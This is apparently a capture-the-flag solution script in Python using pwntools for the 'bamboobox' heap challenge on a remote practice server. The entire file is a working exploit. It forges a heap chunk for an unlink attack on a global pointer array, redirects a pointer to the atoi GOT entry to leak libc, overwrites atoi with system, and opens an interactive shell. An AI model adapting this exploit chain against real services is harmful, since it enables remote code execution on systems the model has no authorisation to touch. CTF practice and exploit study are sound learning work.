from pwn import *

#context.log_level = 'debug'

p = remote('node4.buuoj.cn', 25737)
#p = process('./bamboobox')
elf = ELF('bamboobox')
#libc = ELF('libc-2.23.so')
libc = ELF('libc-2.23.buu.so')

def alloc(size):
    p.sendlineafter(b'Your choice:', b'2')
    p.sendlineafter(b'length of item name:', str(size).encode())
    p.sendafter(b'name of item:', b'a')

def edit(index, size, content):
    p.sendlineafter(b'Your choice:', b'3')
    p.sendlineafter(b'index of item:', str(index).encode())
    p.sendlineafter(b'length of item name:', str(size).encode())
    p.sendlineafter(b'name of the item:', content)

def delete(index):
    p.sendlineafter(b'Your choice:', b'4')
    p.sendlineafter(b'index of item:', str(index).encode())

def show():
    p.sendlineafter(b'Your choice:', b'1')

heaparray = 0x6020C0

alloc(0x20) #0
alloc(0x80) #1
payload = p64(0) + p64(0x21) 
payload += p64(heaparray + 0x8 - 0x18) + p64(heaparray + 0x8 - 0x10)
payload += p64(0x20) + p64(0x90)
edit(0, 0x30, payload)
delete(1)

payload = b'a' * 0x10 + p64(0x20) + p64(elf.got['atoi'])

edit(0, 0x20, payload)
show()
p.recvuntil(b'0 : ')
atoi_real_addr = u64(p.recvuntil(b'\n')[-7:-1].ljust(8, b'\x00'))
libc_base = atoi_real_addr - libc.sym['atoi']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

edit(0, 0x8, p64(system))

p.recvuntil(b'choice:')
p.sendlineafter(b'Your choice:', b'sh\x00')

p.interactive()